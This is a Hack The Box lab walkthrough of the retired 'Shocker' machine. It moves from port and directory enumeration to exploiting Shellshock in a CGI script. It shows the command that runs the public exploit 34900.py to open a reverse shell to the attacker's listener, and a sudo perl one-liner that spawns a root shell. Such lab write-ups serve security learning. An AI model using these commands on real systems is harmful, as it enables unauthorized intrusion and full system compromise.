# :game_die: Htb Shocker 51B95545379F

---

## 🚀Introduction

The Shocker machine on Hack The Box is an excellent tool to learn and exploit the Shellshock vulnerability. In this walkthrough, we will enumerate this retired machine step by step and capture the user and root flags, demonstrating a real-world example of this catastrophic exploit.

## 🔍 Enumeration

First, we begin by scanning for open ports on the target machine.

I assigned the IP address to the variable `$Shocker` and performed an Nmap full port scan:

```
nmap -p- -T4 $Shocker

Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2025-04-25 11:05 EDT
Nmap scan report for 10.10.10.56
Host is up (0.066s latency).
Not shown: 65533 closed tcp ports (reset)
PORT STATE SERVICE
80/tcp open http
2222/tcp open EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 33.71 seconds
```

Two ports are open:

- Port 80 — HTTP (Apache web server)

- Port 2222 — SSH

Since web servers usually have more attack surface, I focused first on port 80.

Next, I performed a version and service detection scan:

```
nmap -sCV -p80,2222 -A -T4 $Shocker
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2025-04-25 11:06 EDT
Nmap scan report for 10.10.10.56
Host is up (0.055s latency).

PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|*http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|* 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT ADDRESS
1 58.36 ms 10.10.14.1
2 58.45 ms 10.10.10.56

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.30 seconds
```

Key findings from the scan:

- Apache/2.4.18 running on port 80 (Ubuntu)

- OpenSSH 7.2p2 on port 2222 (Ubuntu)

Since port 80 is running a public-facing Apache web server, it offers a good opportunity for further exploration.

## 🌐 Website Enumeration

I used WhatWeb to get additional web technology information:

```
whatweb http://$Shocker

http://10.10.10.56 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.56]
```

Results showed:

- Apache/2.4.18

- HTML5 detected

- Ubuntu Linux server

There was no major new information here beyond what Nmap already revealed.

## 📂 Web Directory Enumeration

To discover hidden directories and files, I used dirsearch:

Let’s search for directories in the website.

```
python dirsearch.py -u http://$Shocker

_|. _ _ _ _ _ _|_ v0.4.3
(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12288

Target: http://10.10.10.56/

[11:10:58] Scanning:

[11:11:17] 403 - 294B - /cgi-bin/

[11:11:25] 200 - 137B - /index.html

[11:11:35] 403 - 299B - /server-status

[11:11:35] 403 - 300B - /server-status/

Task Completed
```

Results:

- `/cgi-bin/` — 403 Forbidden

- `/index.html` — 200 OK

- `/server-status/` — 403 Forbidden

The discovery of `/cgi-bin/` caught my attention because it often contains executable CGI scripts — which are known to be vulnerable in certain versions of Apache setups.

Since `/cgi-bin/` was interesting, I focused on searching specifically for `.sh` files:

```
python [dirsearch.py](http://dirsearch.py/) -u http://10.10.10.56/cgi-bin -e sh

_|. _ _ _ _ _ _|_ v0.4.3
(_||| _) (/_(_|| (_| )

Extensions: sh | HTTP method: GET | Threads: 25 | Wordlist size: 9671

Target: http://10.10.10.56/

[11:53:45] Scanning: cgi-bin/

[11:53:47] 403 - 307B - /cgi-bin/.htaccess-dev

[11:53:47] 403 - 303B - /cgi-bin/.htaccess
[11:53:47] 403 - 298B - /cgi-bin/.hta

[11:53:47] 403 - 305B - /cgi-bin/.ht_wsr.txt
[11:53:47] 403 - 309B - /cgi-bin/.htaccess-local

[11:53:47] 403 - 308B - /cgi-bin/.htaccess.bak1
[11:53:47] 403 - 307B - /cgi-bin/.htaccess.old
[11:53:47] 403 - 307B - /cgi-bin/.htaccess.bak
[11:53:47] 403 - 308B - /cgi-bin/.htaccess.save
[11:53:47] 403 - 309B - /cgi-bin/.htaccess-marco

[11:53:47] 403 - 304B - /cgi-bin/.htaccess/

[11:53:47] 403 - 308B - /cgi-bin/.htaccess.orig
[11:53:47] 403 - 307B - /cgi-bin/.htaccess.BAK
[11:53:47] 403 - 307B - /cgi-bin/.htaccess.txt
[11:53:47] 403 - 309B - /cgi-bin/.htaccess_extra
[11:53:47] 403 - 307B - /cgi-bin/.htaccess.inc
[11:53:47] 403 - 306B - /cgi-bin/.htaccess_sc
[11:53:47] 403 - 310B - /cgi-bin/.htaccess.sample
[11:53:47] 403 - 307B - /cgi-bin/.htaccessOLD2
[11:53:47] 403 - 306B - /cgi-bin/.htaccessBAK
[11:53:47] 403 - 304B - /cgi-bin/.htaccess~
[11:53:47] 403 - 306B - /cgi-bin/.htaccessOLD
[11:53:47] 403 - 308B - /cgi-bin/.htaccess_orig
[11:53:47] 403 - 302B - /cgi-bin/.htgroup

[11:53:47] 403 - 299B - /cgi-bin/.html
[11:53:47] 403 - 307B - /cgi-bin/.htpasswd.bak
[11:53:47] 403 - 308B - /cgi-bin/.htpasswd_test
[11:53:47] 403 - 304B - /cgi-bin/.htpasswds
[11:53:48] 403 - 307B - /cgi-bin/.htpasswd.inc
[11:53:48] 403 - 304B - /cgi-bin/.htpasswd/

[11:53:48] 403 - 305B - /cgi-bin/.httr-oauth
[11:53:48] 403 - 307B - /cgi-bin/.htpasswd-old

[11:53:48] 403 - 302B - /cgi-bin/.htusers

[11:53:48] 403 - 298B - /cgi-bin/.htm

[11:53:48] 403 - 303B - /cgi-bin/.htpasswd

[11:54:23] 200 - 118B - /cgi-bin/user.sh
```

Key finding:

- `/cgi-bin/user.sh` — 200 OK

Opening `user.sh`, it only showed three lines of code, behaving similarly to the Linux `uptime` command.
However, the presence of a `.sh` script under `/cgi-bin/` is highly suspicious and often linked to vulnerabilities.

## 🛠️ Vulnerability Research

I used searchsploit to find known exploits related to Apache and CGI:

## Get CyberQuestor’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Later, I tried to check for apache cgi vulnerabilities using searchsploit

```
searchsploit "apache cgi"

Exploit Title | Path

Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote | php/remote/29290.c
Apache 0.8.x/1.0.x / NCSA HTTPd 1.x - 'test-cgi' | cgi/remote/20435.txt
Apache 1.1 / NCSA HTTPd 1.5.2 / Netscape Server 1 | multiple/dos/19536.txt
Apache 1.3.34/1.3.33 (Ubuntu / Debian) - CGI TTY | linux/local/3384.c
Apache 2.2.2 - CGI Script Source Code Information | multiple/remote/28365.txt
Apache mod_cgi - 'Shellshock' Remote Command Inje | linux/remote/34900.py
Apache Tomcat - CGIServlet enableCmdLineArguments | windows/remote/47073.rb
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.4 | windows/webapps/42953.txt
AWStats 6.x - Apache Tomcat Configuration File Ar | cgi/webapps/35035.txt

Shellcodes: No Results
```

From the results, I spotted something important:

- Apache mod_cgi — ‘Shellshock’ Remote Command Injection → `linux/remote/34900.py`

This matched perfectly with the machine’s hint and service configuration. I downloaded the exploit script related to Shellshock and prepared for exploitation.

## 🛡️Shellshock

- Type: Remote Code Execution (RCE)

- Affected Component: GNU Bash Shell (versions ≤ 4.3)

- CVSS Score: 10.0 (Critical)

- Published: September 2014

- Patched by: Various GNU Bash patches starting September 24, 2014

Affected Systems:

- Linux, Unix, macOS systems using vulnerable Bash versions

- Any application that uses Bash to process environment variables (especially CGI scripts)

Exploitation:

- Publicly available exploits

- Attackers craft environment variables containing malicious code

- Exploitable through HTTP headers, DHCP requests, SSH forced command environments, and other services invoking Bash

## ⚡ Exploitation

After downloading the `34900.py` script associated with the Shellshock vulnerability, we can use it to exploit the machine.

At line 93 of the script, I modified the target path to point to `/cgi-bin/user.sh`.
This change allows us to trigger remote code execution through the vulnerable Bash script.

I launched the exploit and we successfully received a reverse shell on the machine!

```
python2 [34900.py](http://34900.py/) payload=reverse rhost=10.10.10.56 lhost=10.10.14.20 lport=4443

[!] Started reverse shell handler
[-] Trying exploit on : /cgi-sys/entropysearch.cgi
[*] 404 on : /cgi-sys/entropysearch.cgi
[-] Trying exploit on : /cgi-sys/defaultwebpage.cgi
[*] 404 on : /cgi-sys/defaultwebpage.cgi
[-] Trying exploit on : /cgi-mod/index.cgi
[*] 404 on : /cgi-mod/index.cgi
[-] Trying exploit on : /cgi-bin/test.cgi
[*] 404 on : /cgi-bin/test.cgi
[-] Trying exploit on : /cgi-bin-sdb/printenv
[*] 404 on : /cgi-bin-sdb/printenv
[-] Trying exploit on : /cgi-bin/user.sh
[!] Successfully exploited
[!] Incoming connection from 10.10.10.56
10.10.10.56> ls
[user.sh](http://user.sh/)

10.10.10.56> whoami
shelly
```

Once we obtain a shell, retrieving the user flag becomes straightforward.
The flag is located in the `/home/shelly` directory inside the `user.txt` file.

```
10.10.10.56> cd /home
10.10.10.56> ls
shelly

10.10.10.56> cd shelly
10.10.10.56> ls
user.txt

10.10.10.56> cat user.txt
```

Next, I needed to find a way to escalate privileges and capture the root flag.

Checking sudo permissions:

```
sudo -l
Matching Defaults entries for shelly on Shocker:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User shelly may run the following commands on Shocker:
(root) NOPASSWD: /usr/bin/perl
```

The user shelly has passwordless sudo access to Perl — a great privilege escalation opportunity!

I referred to [GTFOBins](https://gtfobins.github.io/) and found a way to exploit this.

Using Perl to spawn a root shell:

```
sudo perl -e 'exec "/bin/sh";'
10.10.10.56> whoami
root
```

✅ We now have a root shell! Let’s go to the /root and print the contents in the root.txt file

```
10.10.10.56> cd /root
10.10.10.56> ls
root.txt
```

```
10.10.10.56> cat root.txt
```

🎉 That’s it — we owned both user and root flags successfully and finished the machine.

Let’s continue learning and hacking together. Stay tuned for more writeups!

---
